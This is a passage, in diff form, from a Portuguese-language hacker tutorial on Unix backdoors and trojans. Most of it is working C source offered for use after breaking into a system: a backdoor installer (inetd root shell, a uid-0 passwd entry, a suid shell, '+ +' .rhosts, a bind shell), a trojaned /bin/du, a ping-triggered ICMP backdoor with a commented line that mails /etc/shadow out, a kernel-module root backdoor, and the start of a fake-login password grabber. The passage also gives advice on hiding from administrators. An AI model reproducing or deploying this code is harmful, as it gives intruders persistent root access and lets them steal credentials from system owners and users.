+forward();
+suid();
+rlog();
+binda(argv[0],argv[1]);
+printf("\n\n*** Todas as Backdoors Foram Instaladas com Sucesso!! ***\n");
+}
+}
+void uso(char *nome){
+system("clear");
+printf("****************** NL - AUTOMATIZADOR DE BACKDOORS ******************\n");
+printf("\nUso: %s <tipo>\n\n",nome);
+printf("Onde tipo pode ser:\n");
+printf("inetd -> Acrescenta backdoor no /etc/inetd.conf.\n");
+printf("crond -> Acrescenta backdoor via crond.\n");
+printf("passw -> Acrescenta usuario uid 0 e gid 0 no /etc/passwd.\n");
+printf("fowar -> Linka /etc/passwd a um arquivo .foward.\n");
+printf("suid  -> Copia uma shell(/bin/sh) com suid root.\n");
+printf("rlog  -> Cria arquivo .rhosts para rlogin.\n");
+printf("binda -> Binda uma shell a uma determinada porta.\n");
+printf("todas -> Instala todas as backdoors acima citadas.\n\n");
+exit(0);
+}
+int inetd(){
+char nome[20],coloca[50];
+printf("**** Instalando Backdoor no inetd ****\n\n");
+printf("Digite o nome do processo ou o numero da porta a acoplar: ");
+scanf("%s",&nome);
+sprintf(coloca,"%s\tstream\ttcp\tnowait\troot\t/bin/sh\tsh\n",nome);
+arquivo = fopen("/etc/inetd.conf","a+");
+if(arquivo == NULL){
+fprintf(stderr,"Erro na abertura do arquivo!\n");
+exit(ERRO);
+}
+fputs(coloca,arquivo);
+fclose(arquivo);
+if(fork() ==0){
+execl("/bin/killall","killall","-1","inetd",0);
+}
+printf("Backdoor Instalada com Sucesso!!\n\n");
+}
+
+int crond(){
+char hora[5],dia[5],mes[5],minuto[5],semana[5];
+char coloca1[30], coloca2[40],coloca3[60],resposta[4], user[20];
+char comando[50];
+printf("**** Agendando crond para Executar uma backdoor ****\n\n");
+printf("Digite o mes q vc quer q seja aberta a back(* p/ todos): ");
+scanf("%s",&mes);
+printf("Digite o dia q vc quer q seja aberta a back(* p/ todos): ");
+scanf("%s",&dia);
+printf("Digite a hora q vc quer q seja aberta a back(0 a 23): ");
+scanf("%s",&hora);
+printf("Digite o minuto q vc quer q seja aberta a back(0 a 59): ");
+scanf("%s",&minuto);
+printf("Digite o dia da semana, caso queira(0 a 6) ou (* p/ todos): ");
+scanf("%s",&semana);
+sprintf(coloca1,"%s %s %s %s %s",minuto,hora,dia,mes,semana);
+printf("Voce quer que seja acrescentado um user no passwd(s/n)? ");
+scanf("%s",&resposta);
+if(!strcmp(resposta,"s")){
+printf("Digite o nome do usuario a ser acrescentado: ");
+scanf("%s",&user);
+sprintf(coloca2,"/bin/echo \"%s::0:0::/:/bin/sh\" >> /etc/passwd",user);
+arquivo = fopen("./cronjobs","a+");
+if(arquivo == NULL){
+printf("Erro ao abrir o arquivo para escrita\n");
+exit(ERRO);
+}
+sprintf(coloca3,"%s %s",coloca1,coloca2);
+fputs(coloca3,arquivo);
+fclose(arquivo);
+if(fork() == 0){
+execl("/usr/bin/crontab","crontab","cronjobs",0);
+}
+printf("Backdoor Executada com Sucesso!!\n\n");
+}
+else{
+printf("Digite o comando que quer executar: ");
+scanf("%s",&comando);
+sprintf(coloca3,"%s %s",coloca1,comando);
+arquivo = fopen("./cronjobs","a+");
+if(arquivo == NULL){
+printf("Erro ao abrir o arquivo para escrita.\n");
+exit(ERRO);
+}
+fputs(coloca3,arquivo);
+fclose(arquivo);
+if(fork() == 0){
+execl("/usr/bin/crontab","crontab","cronjobs",0);
+}
+printf("Backdoor Executada com Sucesso!!\n\n");
+}
+}
+int passw(){
+char login[20],coloca[50];
+printf("**** Instalando Backdoor do passwd ****\n\n");
+printf("Digite o login que deseja acrescentar: ");
+scanf("%s",&login);
+sprintf(coloca,"%s::0:0::/:/bin/sh",login);
+arquivo = fopen("/etc/passwd","a+");
+if(arquivo == NULL){
+printf("Erro ao abrir o arquivo passwd(/etc/passwd).\n");
+exit(ERRO);
+}
+fputs(coloca,arquivo);
+fclose(arquivo);
+printf("Backdoor Instalada com Sucesso!!\n\n");
+}
+
+int forward(){
+char diretorio[30],arquivo[20],path[40],argumento[10];
+printf("**** Linkando /etc/shadow para arquivo .forward ****\n\n");
+printf("Digite o Diretorio aonde quer linkar o shadow: ");
+scanf("%s",&diretorio);
+sprintf(path,"%s/.forward",diretorio);
+strcpy(argumento,"4777");
+/* Obs: Se for Red Sux sem shadow, altere abaixo */
+strcpy(arquivo,"/etc/shadow");
+if(fork() == 0){
+execl("/bin/ln","ln",arquivo,path,0);}
+if(fork() == 0){
+execl("/bin/chmod","chmod",argumento,path,0);
+}
+printf("Arquivo Linkado com Sucesso!!\n\n");
+}
+
+int suid(){
+char diretorio[30],shell[20],argumento[10];
+printf("**** Copiando Shell com suid root ****\n\n");
+printf("Digite o PATH(Ex:/tmp/shell) que  quer que seja copiada a shell: ");
+scanf("%s",&diretorio);
+strcpy(shell,"/bin/sh");
+strcpy(argumento,"04777");
+if(fork() == 0){
+execl("/bin/cp","cp",shell,diretorio,0);}
+if(fork() == 0){
+execl("/bin/chmod","chmod",argumento,diretorio,0);
+}
+printf("Shell Copiada com Sucesso!!\n\n");
+}
+int rlog(){
+char dire[40],path[50],escreve[10];
+printf("**** Instalando Backdoor Para rlogin ****\n\n");
+printf("Digite o diretorio home para instalar arquivo: ");
+scanf("%s",&dire);
+sprintf(path,"%s/.rhosts",dire);
+strcpy(escreve,"+ +");
+arquivo = fopen(path,"a+");
+if(arquivo == NULL){
+fprintf(stderr,"Erro na Abertura do Arquivo!\n");
+exit(ERRO);
+}
+fputs(escreve,arquivo);
+fclose(arquivo);
+printf("Backdoor Instalada com Sucesso!!\n\n");
+}
+
+int binda(){
+int porta;
+int Meusocket;
+int tamanho, conector;
+struct sockaddr_in hacker;
+struct sockaddr_in vitima;
+char engana[50];
+
+printf("**** Instalando Backdoor Bind Shell!! ****\n\n");
+printf("Digite o Numero da Porta Para Bindar a Shell: ");
+scanf("%d",&porta);
+if(fork() == 0){
+vitima.sin_family=AF_INET;
+vitima.sin_addr.s_addr= htonl(INADDR_ANY);
+vitima.sin_port= htons(porta);
+bzero(&(vitima.sin_zero), 8);
+Meusocket = socket(AF_INET,SOCK_STREAM,0);
+if(Meusocket < 0){
+fprintf(stderr,"Erro em socket()!\n");
+exit(ERRO);
+		 }
+bind(Meusocket,(struct sockaddr *)&vitima,sizeof(vitima));
+if(bind < 0){
+fprintf(stderr,"Erro em bind()!\n");
+exit(ERRO);
+	    }
+listen(Meusocket,2);
+tamanho = sizeof(hacker);
+conector=accept(Meusocket,(struct sockaddr *)&hacker,&tamanho);
+if(conector < 0){
+fprintf(stderr,"Erro em accept()!\n");
+		}
+dup2(conector,0);
+dup2(conector,1);
+dup2(conector,2);
+execl("/bin/sh","sh",0);
+        }
+printf("\n**** Backdoor Instalada com Sucesso!! *****\n\n");
+}
+---------------------------------------------------------------------------
+
+Aih estah um programa que automatiza todas as backdoors ultrapassadas
+descritas acima.Nao eh um programa pratico, veja se terah alguma utilidade
+para voce, o importante neste caso eh somente conhecer como funciona e
+se instala essas backdoors.
+
+3.2. Tecnicas Mais Atuais
+--------------------------
+
+Vamos ver agora algumas tecnicas mais atuais de backdoors.Estas tecnicas
+tambem sao muito difundidas, um administrador responsavel com certeza
+possui conhecimentos destas tecnicas, irei descreve-las visando o pessoal
+NewBie, para que se possa ter varias opcoes em caso de rootiamento(que
+palavra hein!) bem sucedido.
+Uma vez que o invasor conseguiu se tornar root na rede invadida, as
+possiveis opcoes de backdoor sao infindaveis e incontaveis.Com um
+conhecimento basico de C, eh possivel garantir o acesso futuro a rede de
+modo eficaz, mesmo que o administrador da rede possua bons conhecimentos
+de tecnicas usadas por fucadores.Essas tecnicas mais atuais visam
+justamente dificultar a percepcao, por parte dos administradores de rede,
+das backdoors instaladas no sistema.Veremos alguns esquemas bem basicos
+deste tipo de backdoors.
+
+3.2.1 Criando Arquivo Suid que Executa Shell Root
+--------------------------------------------------
+
+No item anterior vimos um tipo de backdoor que copiava uma root shell e
+depois tornava o arquivo suid, para que, num futuro proximo, o invasor
+pudesse obter uma shell root apenas executando o arquivo(quimera.txt).
+Mas, como foi dito, existem sistemas que colocam protecoes, onde, antes de
+se executar uma shell, o syscall getuid fornece a uid do usuario
+impedindo-o a execucao da root shell.Para contornar este problema, um
+invasor com conhecimentos basicos de Linux e C, pode perfeitamente criar
+um programa que seta primeiro a uid como zero(root) e depois executa a
+shell ou caso deseje algum outro comando.Vejamos um exemplo deste programa:
+
+---------------------------------setback.c-----------------------------------
+
+/* Backdoor que envia um setuid(0) e em seguida executa um /bin/sh 
+   Desenvolvido por Nash Leon p/ tutorial sobre Backdoors e Troajns.*/
+
+#include <stdio.h>
+#include <unistd.h>
+
+main(){
+setuid(0);
+execl("/bin/sh","sh",0);
+}
+-----------------------------------------------------------------------------
+
+Pronto amigo, compile este programa como root, depois torne-o suid(chmod
++s arquivo).Como podemos ver, nao tem muito segredo.Mas ainda nao eh um
+bom esquema, mais abaixo veremos o porque.
+
+3.2.2 - Criando Arquivo Suid e Camuflando-o 
+--------------------------------------------
+
+Vimos acima a execucao de um programa para nos dar root shell.Veremos
+agora outro possivel esquema para os mesmo intuito.Um arquivo, que
+geralmente nao eh muito usado eh o "/bin/du", existem diversos outros,
+muitos ateh melhores, mas citarei este.Se um administrador de redes eh
+descuidado, poderemos fazer algumas coisinhas.Como root compilamos o 
+programa abaixo:
+
+-------------------------------backdu.c---------------------------------
+
+/* Simples Backdoor Camuflada num Programa.
+   Desenvolvido por Nash Leon vulgo coracaodeleao.
+   nashleon@yahoo.com.br
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define   MAGICA     "nashleon"
+#define   DU      "/usr/bin/dul"
+
+main(int argc, char *argv[]){
+char opcao[100], arquivo[50];
+if(argc == 1){
+execl(DU,"du",0);
+}
+if(argc > 1){
+if(!strcmp(argv[1],MAGICA)){
+printf("Backdoor Executada!!\n");
+setuid(0);
+execl("/bin/sh","sh",0);
+}
+if(argv[1]){
+strcpy(opcao,argv[1]);
+if(argv[2]){
+strcpy(arquivo,argv[2]);
+execl(DU,"du",opcao,arquivo,0);
+           }
+execl(DU,"du",opcao,0);
+          }
+}
+}
+---------------------------------------------------------------------------
+
+Bom, amigo, agora possiveis esquemas para isso.Poderiamos mover o
+executavel do du (/bin/du) para /usr/bin/dul, compilamos o programa acima 
+como /bin/du, em seguida chmod +s /bin/du, isto faria com que o programa
+acima nos desse uma shell quando executarmos ele da seguinte maneira:
+
+[NewBie@redelamer.com]$ /bin/du nashleon
+
+Se for executado com argumento diferente ao definido como "MAGICO", o
+programa /usr/bin/dul(du verdadeiro) serah executado sem problemas.
+Voce pode alterar o passe magico, pode tambem colocar para poder receber
+mais argumentos, coloquei somente dois para ilustrar.Esse esquema soh
+seria uma boa com administradores displicentes(XX%)..:)..Uma implementacao
+muito mais eficaz deste esquema eh criar num arquivo que jah eh suid root
+default por natureza e pouco usado(Exemplos: /usr/lib/uucp/uuchk; 
+/usr/libexec/pt_chown; /sbin/cardctl), procure no sistema aonde voce
+estiver e veja o estado da rede, isso varia muito de sistema para sistema.
+
+
+3.2.3 - Backdoor via ping
+--------------------------
+
+Recentemente o module do Unsekurity Team publicou um txt falando sobre uma
+possivel "falha" no protocolo ICMP permitindo assim que uma backdoor fosse
+instalada e inicializada via ping.Isso nao eh coisa nova,mas eh um bom
+esquema no intuito de camuflar a backdoor de comandos como netstat.Existem
+diversos esquemas para esta backdoor, com destaque para um programa feito
+pelo jamez da sekure.org que pode ser obtido em:
+http://packetstorm.securify.com/new-exploits/ping-back.c
+Eu desenvolvi um programa mais simples que executa uma backdoor
+e apos seu uso(soh permite usar 1 vez) o processo eh derrubado, mas como
+outra backdoor menos discreta(inetd) terah sido entao instalada lah,
+podemos acessar a rede alvo e qualquer coisa acionarmos novamente esta
+backdoor.Aih vai o fonte:
+
+------------------------------nlicmp.c---------------------------------
+
+/* Backdoor Camuflada e Executada via ping.
+   Desenvolvida por Nash Leon vulgo coracaodeleao.
+   nashleon@yahoo.com.br
+   Com base no icmp tunelling(module) e na backdoor
+   do jamez(jamez@sekure.org).
+   Uma versao do tutorial do module pode ser obtida em:
+   http://unsekurity.virtualave.net/
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <signal.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+/* Altere aqui para o nome do programa que voce quer que apareca em
+   eventuais ps aux, top e etc.. */
+
+#define   NOME_PROC     "[kflushd]"
+#define   ERRO           -1
+
+int backdoor();
+int main(int argc, char *argv[]){
+int Meusocket, tamanho_iniciar;
+int recebe, tam;
+char pacote[4096];
+struct sockaddr_in hacker;
+if(argc < 2) {
+printf("\n**** Backdoor via PING By Nash Leon ****\n");
+printf("\nuso: %s <tamanho_pacote>\n\n", argv[0]);
+printf("Para Executa-la digite em seu host local:\n");
+printf("[hacker]# ping <ip_da_vitima> -s <tamanho_pacote>\n\n");
+exit(0);
+}
+
+tamanho_iniciar = atoi(argv[1]);
+memset(argv[0],0,100);
+strcpy(argv[0],NOME_PROC);
+
+if (fork() == 0) {
+Meusocket = socket(AF_INET,SOCK_RAW,1);
+if(Meusocket < 0){
+exit(ERRO);
+                }
+while(1){
+tam = sizeof(hacker);
+recebe = recvfrom(Meusocket,pacote,sizeof(pacote),0,(struct sockaddr
+*)&hacker,&tam);
+if(recebe == tamanho_iniciar+28){
+backdoor();
+exit(0);
+                           }
+}
+}
+}
+/* Voce pode alterar o esquema abaixo para um mais funcional */
+int backdoor(){
+system("echo \"20000 stream  tcp  nowait  root  /bin/sh sh\" >>
+/etc/inetd.conf");
+system("inetd");
+/* system("cat /etc/shadow | mail NewBie@redexxx.com.br") */
+return 0;
+}
+-------------------------------------------------------------------------
+
+Voce pode alterar este esquema de backdoor para qualquer um outro,veja
+o que poderah ser mais util para voce.Uma vez instalada a backdoor no
+servidor rootiado, tudo que voce precisa fazer eh executar no futuro um
+ping <host_vitima> -s <tamanho do pacote>, esse tamanho do pacote tem que
+ser igual ao que voce colocou no host vitima.A grande vantagem desse tipo
+de backdoor eh que no "netstat -na", irah aparecer uma conexao ativa
+raw, e nao tcp, dificultando assim a percepcao de administradores menos
+experientes.Com um basico de conhecimentos em C, voce poderah fazer
+esquemas melhores.Alguns esquemas melhores que este, alem do esquema do
+jamez, sao: o da itunnel da teso(http://teso.scene.at/), os programas 
+icmp_pipe.c e icmp_client.c, ambos requerem algumas modificacoes, da
+w00w00 (www.w00w00.org), bem como o proprio projeto LOKI descrito na
+phrack(www.phrack.com - itens P49-6 e P51-6).De uma lida no txt do module
+em http://unsekurity.virtualave.net/ e saiba mais sobre Tuneis ICMP.Se
+voce tah manjando bem de sockets poderah notar que esse esquema pode ser
+expandido, pois eh uma comparacao de recvfrom() que executa toda a magica.
+
+3.2.4 - Backdoor em LKM (Loadable Kernel Module)
+--------------------------------------------------
+
+O Linux eh um poderoso sistema operacional, defini-se ele como sendo o
+sistema operacional "feito por programadores para programadores".A
+programacao de Kernel Modules pode ser encontrada em varios sistemas
+operacionais, dentre eles, linux, solaris, bsd e etc..
+Algum tempo atras, um grupo de hackers alemao divulgou um excelente
+tutorial  ensinando como se programar LKM.O fato eh que bem antes
+desse tutorial sair, jah existiam tecnicas para se aproveitar desta
+poderosa ferramenta para executar intuitos fucadores.Podemos ver isso nas
+PHRACKS 51-9 e 52-18, leia as duas, pois os possiveis esquemas descritos
+nelas sao "extraordinarios", um pouco antigos, mas ainda podem ser
+aplicados em varios casos.Quanto ao tutorial da THC(The Hackers Choice),
+este tutorial pode ser obtido em http://www.infowar.co.uk/thc/ , lah
+voce poderah encontrar tambem tutoriais sobre kernel modules em Solaris
+e FreeBSD.Soh para ilustrar a importancia destas tecnicas que envolvem
+Kernel Modules, em alguns casos, eh possivel sequestrar um tty, e
+consequentemente um Terminal.O que fica evidenciado com isso tudo eh
+que um fucador precisa dominar bem o sistema operacional, tenho me
+especializado em linux, mas faz-se necessario conhecer o basico sobre
+varios sistemas operacionais.Leia o documento da the hackers choice e
+verah o poder que representa o dominio desses LKMs.Vejamos um exemplo
+dessas LKMs.
+
+------------------------------NLkmback1.c-----------------------------
+
+/* SIMPLES EXEMPLO DE BACKDOOR EM LKM!!
+   TORNA TODOS OS USUARIOS COM UID IGUAL A 0.
+   DESENVOLVIDO POR NASH LEON VULGO CORACAODELEAO.
+   nashleon@yahoo.com.br
+   Feito para kernel 2.2.13 (Slackware 7.0).
+*/
+
+#define     MODULE
+#define   __KERNEL__
+
+/* Headers.Muito cuidado ao manipular em kerneis diferentes!! */
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/stat.h>
+#include <linux/mm.h>
+#include <linux/if.h>
+#include <sys/syscall.h>
+#include <asm/unistd.h>
+
+/* Chama a Tabela de Systemcalls */
+
+extern void *sys_call_table[] ;
+
+/* Funcoes que serao usadas p/ "salvar" a configuracao antiga dos
+   usuarios */
+
+int (*original_setuid)(uid_t);
+int (*original_getuid)();
+
+/* Nossa funcao backdoor para sys_setuid */
+
+int back_set(uid_t uid){
+int N;
+if (current->uid != 0){
+current->uid = 0;
+current->euid = 0;
+current->gid = 0;
+current->egid = 0;
+current->suid = 0;
+current->sgid = 0;
+current->fsuid = 0;
+current->fsgid = 0;
+}
+return 0;
+}
+
+/* Nossa funcao backdoor para sys_getuid */
+
+int back_get(){
+int L;
+/* Compara uid atual, se for diferente de zero, ele irah transformar
+   os configuracoes que desejamos */
+
+if (current->uid != 0) {
+current->uid = 0;
+current->gid = 0;
+current->euid = 0;
+current->egid = 0;
+                      }
+        return 0;
+}
+
+/* Funcao inicial.. Uma funcao minima usada em LKM. Assim como em C nos
+   somos obrigados a colocar main(), em LKM somos obrigados a colocar
+   init_module() e cleanup_module(), sendo que, init_module eh usada para
+   carregar os modulos, e cleanup_module() para descarregar o modulo */
+
+int init_module(void){
+printk("<1>BACKDOOR VIA LKM by Nash Leon!!\n");
+printk("<0>\n");
+printk("<1>Instalando Backdoor...\n");
+original_setuid = sys_call_table[__NR_setuid];
+original_getuid = sys_call_table[__NR_getuid];
+sys_call_table[__NR_setuid] = back_set;
+sys_call_table[__NR_getuid] = back_get;
+printk("<1>****.* Unsekurity Team *.****\n");
+printk("<1>Backdoor Instalada com Sucesso!!!\n");
+return 0;
+}
+
+/* Aqui estah cleanup_module() descarregando e fazendo o sistema voltar ao
+   normal.Coloquei uma mensagem de saida, mas voce pode retira-la.Como 
+   quem deve retirar o modulo eh um admin, caso o perceba, voce pode entao,
+   mudar a saida para que imprima algo como Modulo do jogo tal
+   descarregado */
+
+int cleanup_module(void){
+sys_call_table[__NR_setuid] = original_setuid;
+sys_call_table[__NR_getuid] = original_getuid;
+printk("<1>Modulo Descarregado!\n");
+return 0;
+}
+
+-------------------------------------------------------------------------
+
+Compile ela com: gcc -c -O3  NLkmback1.c.
+Depois para carregar o modulo, como root, digite: insmod NLkmback1.o
+Preste atencao a kernel usada, mecher com LKMs eh um pouco perigoso, voce
+pode literalmente "destruir" o sistema.Para descarrega-la basta digitar:
+"rmmod NLkmback"  ou mesmo "modprobe -r NLkmback".
+Para que voce venha a ter mesmo uma rootshell tudo que voce precisa fazer
+agora eh digitar o comando "/bin/sh".Vamos ver abaixo um esquema do que
+pode-se fazer com isso:
+
+* Assim que rootiar o sistema:
+
+#gcc -c -O3  NLkmback1.c
+#insmod NLkmback1.o
+
+* Num acesso normal a shell(como usuario normal) futuramente:
+
+$ id
+uid=0(root) gid=0(root) euid=1000(nashleon) groups=100(users)
+$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+$ /bin/sh
+# id
+uid=0(root) gid=0(root) groups=100(users)
+# cat /etc/shadow
+root:$1$1UhFt4n/$xs/ddkr.eN.....
+
+Como podemos ver, eh algo interessante mesmo, mas tem esquemas melhores
+ainda.No meu exemplo, todos os usuarios se tornariam root, conhecendo um
+pouco de C e LKM, voce facilmente poderia impedir que todos tivessem uid
+igual a 0, voce tambem poderia botar esse modulo para ser carregado
+sempre, seja via rc.d ou se dominar bem LKM e linux, existem esquemas
+melhores ainda, de qualquer forma, vale a esperteza do fucador, cada
+sistema eh um caso, e as kerneis possuem particularidades, quando for
+programar LKMs cuidado com os headers, enfim, existe infinitas
+possibilidades com LKMs.Gostaria de dizer algo, nao posso afirmar, como
+tenho dito, conheco um pouco de Linux somente, mas creio que Loadable
+Kernel Modules existem em todos os SOs, nao sei, soh tenho conhecimento
+veridico de alguns, se voce eh admin, tome cuidado! Se com linux, que eh
+codigo aberto, as dificuldades impostas para os admins sao consideraveis
+quanto mais com codigo fechado!!(Que digam as VxDs..:)!!).
+Existem esquemas melhores que este, podemos ver alguns como:
+
+adore-0.14.tar.gz -> Desenvolvido pela Teso(http://teso.scene.at/).
+phide.tar.gz -> by noupe (Pode ser encontrado na packetstorm).
+taskigt.tar.gz -> by noupe (http://ns2.crw.se/~tm/ ou na packet).
+
+Devem existir bem mais por aih, principalmente do pessoal que nao publica
+o quente...:)..
+
+Mais uma vez, fica evidenciado que se o administrador ou o responsavel
+pela seguranca nao tiver conhecidos plenos do Sistema Operacional que
+usa em sua rede, a melhor coisa que ele tem a fazer eh desligar o servidor
+da tomada.Existe um programa chamado sec_lkm.c by pIGpEN, que tambem pode
+ser obtido na packetstrom, esse programa eh um "LKM DETECTOR", mas para
+FreeBSD, para linux ainda nao tenho conhecimento de algum, somente de
+possiveis protecoes "autonomas" por parte dos admins descritas no tutorial
+da The Hackers Choice, lah tem alguns prototipos tambem.
+Um programa tambem que devemos analisar eh o heroin.c by Runar Jensen,
+seu codigo fonte pode ser obtido no tutorial da THC, ele ilustra bem
+o poder das LKMs e as possiveis dificuldades que um admin pode se deparar.
+Um comentario detalhado do que esta LKM faz segue nesse tutorial.Sem mais
+por enquanto sobre LKM em Linux, por enquanto!!:)
+
+
+3.2.5 - Tuneis
+---------------
+
+Os Tuneis sem duvida sao fantasticos.Os Tuneis ou o conceito de
+tunelamento sao canais feitos pelos invasores para comunicacao direta
+entre host vitima e o futuro invasor, tudo para fugir dos firewalls e
+ferramentas IDS(Sistema de Deteccao de Intrusos ou Intrusao).Dependendo
+do nivel do fucador, os tuneis em alguns casos podem ser as melhores
+opcoes, em especial usado em conjunto com esquemas jah descritos
+anteriormente.Um poderoso tunel que 99% dos firewalls permitiriam acesso
+ao mesmo eh o HTTP TUNEL, pois poucas sao as redes que filtram acesso a 
+porta 80(http).Eh de comum consenso, que quanto maior o nivel de
+conhecimentos por parte do fucador, mais dificil para o administrador da
+rede detecta-lo.Como jah dito anteriormente, existe um tutorial sobre
+Tunel ICMP na home page do Unsekurity Team.Existem tuneis em diversos
+protocolos,e se usado em conjunto com LKM, se torna uma tecnica muito
+efetiva.No meu tutorial de "Programacao Basica de Sockets em C para
+Linux - II Parte", eu descrevo um pouco da teoria sobre esta tecnica.Em
+breve, estaremos disponibilizando mais material, para que o fucador possa
+compreender plenamente esta tecnica.Se for possivel, na continuacao desse
+tutorial eu disponibilizarei um codigo fonte como exemplo.
+
+3.2.6 - Backdoor em Codigo Fonte
+---------------------------------
+
+Um numero consideravel de redes com sistema Linux costumam permanecer com
+os programas padroes, os mesmo programas que vem junto com as
+distribuicoes Linux como um todo.Em alguns casos, na maioria das vezes por
+necessidade, o administrador da rede troca alguns aplicativos por outros,
+mas isso nao eh tao comum.De qualquer forma, um fucador pode muito bem
+antes de invadir o sistema obter informacoes sobre quais programas estao
+sendo executados no servidor alvo, sejam daemons, seja banco de dados, etc.
+Tendo posse dessas informacoes, muitos pacotes do Linux sao Open Source,
+possuem o codigo fonte aberto, entao o fucador poderia baixar o programa,
+alterar o codigo fonte inserindo codigo malicioso, poderia ateh compilar
+na sua maquina local, e apos bem sucedida a invasao ele poderia enviar o
+programa alterado para construir assim uma backdoor.Existem muitos pros e
+contras quanto a isso.Creio eu que existem esquemas mais praticos, mas 
+como cada caso eh um caso, essa tecnica tem sido muito difundida tambem.
+Eu jah vih diversas versoes do wu.ftpd, do sendmail, e imapds alterados.
+Qualquer coisa, de uma olhada na packetstorm e procure por trojans e
+backdoors.
+
+3.3 - RootKits
+---------------
+
+Os Rootkits sao ferramentas poderosissimas.Rootkits que envolvem LKM e
+os que alteram binarios "criticos" podem ser considerados como as melhores
+backdoors hoje disponiveis.Existem RootKits que tornam "invisiveis" as
+acoes de um usuario invasor.No Mundo Unix, os Rootkits sao velhos
+conhecidos.Na Internet existem dezenas desses programas, alguns mais
+eficientes, outros menos.O que esses Rootkits procuram fazer eh alterar
+o sistema para que um invasor que jah tenha rootiado o sistema possa ter
+acesso ao mesmo quase sem preocupacao alguma, pois dentre outras coisas,
+esses RootKits fazem:
+
+* Alteram arquivos do sistema como netstat, ps, top, pstree, who, dentre 
+  outros, para esconder o invasor e suas acoes.
+
+* Abrem portas e/ou Tuneis que nao aparecem em ferramentas basicas de
+  log, bem como no proprio netstat.
+
+Isso em cima eh o basico, existem Rootkits que carregam via modulo e
+depois fazem com que o modulo nao possa ser visto via lsmod;Alguns sao
+capazes de se camuflarem de ferramentas como Tripware; 
+Enfim, sao armas poderosissimas na mao de um invasor.Em tutoriais
+futuros, veremos com bastante calma, algumas das possiveis implementacoes
+desses rootkits.
+
+
+3.4 - Sugestoes
+----------------
+
+Nesse tutorial inicial eu me limitei a descrever tecnicas ultra-basicas 
+de backdoors.Algumas ateh nao sao consideradas tao basicas assim, mas
+jah estao bem difundidas.Sem duvida, dependendo da rede, cada exemplo
+desses descritos acima podem ser aproveitados.Quanto aos tuneis e aos
+rootkits, como sao tecnicas que requerem um conhecimento maior do fucador
+na Pratica de Programacao, bem como de Sistema Operacional e Protocolos
+de Rede, num futuro proximo, talvez algum membro do grupo venha
+disponibilizar em maiores detalhes como se implementa alguma ou mesmo
+todas essas tecnicas.Espero que isso venha a ser util para voce, sem
+mais por enquanto.
+
+
+-------------------
+4 - TROJANS HORSES |
+-------------------
+
+Esta tecnica eh amplamente difundida.Nove em cada 10 internautas jah ouviram 
+falar sobre isso.Sem sombra de duvida que com a divulgacao em massa dos
+trojans para sistemas windows, essa tecnica hoje estah em descredito.A
+massificacao trouxe a tona a facilidade de implementacao dos trojans e de
+seus usos.O que pouca gente sabe eh que isto jah existia ha seculos no
+mundo unix, e como unix requer um maior empenho e atencao do administrador,
+as tecnicas que envolvem trojans horses nao sao consideradas efetivas em
+muitos casos.Com o crescimento que o linux vem demonstrando, volta a tona
+o perigo real por parte desses trojans.Seja um kiddie, um lamer ou mesmo
+um admin descuidado, muita gente estah vulneravel.Irei disponibilizar
+algumas tecnicas deste conceito em sistemas linux, algumas voltadas para
+nivel local(com acesso shell a rede alvo), e outras para nivel remoto(sem
+nenhum acesso a maquina).Lembrando que, assim como no caso das backdoors,
+trojans sao pessoais, tem esquemas que nao foram divulgados ainda e outros
+que pouca gente conhece, eu irei descrever apenas os mais conhecidos,
+creio eu..:)..De qualquer forma, analise-os e veja se tem alguma utilidade
+para voce.
+O uso de trojans por parte de fucadores creio que deve ser em ultimo caso,
+quando tudo falhou(overflows,brutal force, sniffers, eng. social e etc..),
+talvez deva-se recorrer a isso.Lembrando sempre, que voce estarah mais do
+que nunca dependente do usuario, se ele for esperto, voce nao soh
+fracassarah como poderah mesmo se expor, por isso, toda cautela eh pouco!
+
+4.1. Alguns Tipos Basicos
+--------------------------
+
+Nesse tutorial me limitarei a escrever somente esquemas basicos sobre
+trojans,assim como nos exemplos acima sobre backdoors, essa parte sobre
+trojans eh voltada ao pessoal NewBie,talvez num futuro, eu disponibilize
+mais esquemas.
+
+4.1. Trojan de Diretorio
+-------------------------
+
+Essa tecnica de Trojan Horse eh bem antiga.Ha indicios que Ron Austin no
+inicio de 1980 a dominava e a praticava(conforme "A vida excentrica e os
+serials crimes do hacker Kevin Poulsen" de Jonathan Littman), confesso
+que gostei deste livro.De qualquer forma, esta tecnica consiste em enviar
+um arquivo para capturar senhas ou executar determinados comandos como se
+fosse o usuario dono do diretorio home.Possiveis exemplos desses arquivos
+sao os scripts .bashrc, .profile, e etc, que costuma executar comandos
+quando um usuario se loga ao sistema.
+O pre-requisito para que esta tecnica funcione eh justamente poder criar
+ou alterar o arquivo no diretorio home do usuario.
+Muita gente(nao-hackers que desistem facilmente!) conhecem a tecnica usada
+para acessar sistemas NFS, e sabem como mandar arquivos, em especial
+.rhosts para os diretorios home dos usuarios no intuito de obter acesso
+shell ao host vitima.Mas quando nao se tem rlogin habilitado, muitos
+desses "lamers" desistem e vao procurar outras redes ou algum outro
+esquema.De qualquer forma, o administrador da rede que retira rlogin, mas
+deixa diretorio criticos permissiveis a montagem via NFS nao deve ter
+nocao do perigo que estah correndo.Uma vez montado o diretorio, e feito
+o esquema de envio de arquivos via NFS(adduser), pode-se facilmente
+alterar os arquivos e enviar trojans para tentar executar programas ou
+capturar senhas via usuario vitima.Nao irei ensinar este esquema para
+enviar programas e mudar arquivos via NFS, pois existem dezenas de
+tutoriais que ensinam isso, caso necessite, entre em contato comigo e eu
+passarei algum link.Mas vamos ao trojan.
+
+-------------------------------trojdir.c--------------------------------
+
+/* Simples trojan de diretorio que emula um prompt e captura
+   a senha em texto limpo...Bom p/ ser usado em sistemas NFS
+   que nao permitem conexao via rlogin...
+   Desenvolvido por Nash Leon vulgo coracaodeleao.
+   nashleon@yahoo.com.br
+   OBS: Nao me responsabilizo pelo mau uso deste programa.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+extern char *getpass();
+
+main(int argc, char *argv[])
+{
+FILE *catador;
+char login[50], *senha;
+int i;
+/* Abaixo segue o prompt do sistema, altere-o
+p/ que se pareca com o prompt da vitima */
+printf("Login incorrect\n\n");
+printf("Conectiva Red Sux login: ");
+scanf("%s",&login);
+
+/* Se ligue aki, isso varia muito tb de sistema p/ sistema */
